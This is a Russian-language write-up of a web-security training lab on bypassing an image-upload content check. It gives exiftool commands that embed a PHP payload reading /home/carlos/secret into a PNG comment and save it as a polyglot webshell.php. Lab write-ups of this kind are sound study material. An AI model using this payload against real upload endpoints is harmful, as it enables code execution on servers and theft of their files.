Лаборатория содержит уязвимую функцию загрузки изображений. Хотя он проверяет содержимое файла, чтобы убедиться, что это подлинное изображение, все равно можно загружать и выполнять серверный код.

## Дано

учетные данные: `wiener:peter`

## Задача

извлечения содержимого файла. `/home/carlos/secret`

# Разведка

Проверка запроса на загрузку изображения
- Изменения jpg кодировки - `"No user param supplied"`

# Атака

Так как мы знаем об уязвимости то прибегнем к  инструменту ExifTool

- 1 создаём директорию где будем работать над изменением лога
- 2 добавляем коммент php нагрузки
	`exiftool -comment="<?php echo 'Look here' .file_get_contents('/home/carlos/secret')?>"  icons8-обсидиан-250.png`
![[Pasted image 20250127114106.png]]
- 3 делаем файл политканью 
	`exiftool -comment="<?php echo 'Look here ' .file_get_contents('/home/carlos/secret') . '';?>"  icons8-обсидиан-250.png -o webshell.php`
![[Pasted image 20250127114333.png]]
